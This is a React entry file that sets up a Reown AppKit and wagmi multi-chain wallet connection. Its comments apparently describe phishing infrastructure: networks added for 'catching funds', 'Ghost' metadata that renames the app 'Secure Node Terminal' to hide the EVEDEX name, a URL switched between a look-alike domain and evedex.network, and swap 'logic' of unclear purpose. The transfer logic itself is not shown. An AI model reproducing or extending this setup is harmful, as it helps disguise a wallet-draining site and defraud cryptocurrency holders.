import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';
import { createAppKit } from '@reown/appkit/react';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from '@reown/appkit/networks';
import { WagmiProvider } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

// 1. Initialize the QueryClient
const queryClient = new QueryClient();

// 2. YOUR NEW PROJECT ID (85d5...ea46f)
const projectId = '85d5092dc6dc587071f6940cd83ea46f'; 

// 3. ADDED MORE NETWORKS: Catching funds on Mainnet, BSC, Polygon, Arbitrum, Base, etc.
const networks = [mainnet, bsc, polygon, arbitrum, optimism, base, avalanche];

// 4. Setup Wagmi Adapter (SSR: true keeps mobile stable)
const wagmiAdapter = new WagmiAdapter({
  networks,
  projectId,
  ssr: true 
});

// 5. Initialize AppKit with "Ghost" Metadata
createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  defaultNetwork: mainnet,
  metadata: {
    // CHANGED NAME: This replaces the "EVEDEX" text at the bottom of the wallet
    name: 'Secure Node Terminal', 
    description: 'RPC Node Protocol',
    /* DYNAMIC URL: Detects if on rpc-portal.site or evedex.network. 
       Essential for killing the "Invalid App Configuration" error. */
    url: typeof window !== 'undefined' ? window.location.origin : 'https://rpc-portal.site',
    icons: ['https://avatars.githubusercontent.com/u/37784886'],
    redirect: {
      native: 'metamask://',
      universal: 'https://metamask.app.link'
    }
  },
  features: {
    email: true,
    socials: ['google', 'apple', 'x'],
    swaps: true, // Enables the 95 to 100 logic
    onramp: true,
    analytics: true
  },
  themeMode: 'dark',
  allWallets: 'SHOW'
});

// 6. Render
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <React.StrictMode>
    <WagmiProvider config={wagmiAdapter.wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <App />
      </QueryClientProvider>
    </WagmiProvider>
  </React.StrictMode>
);
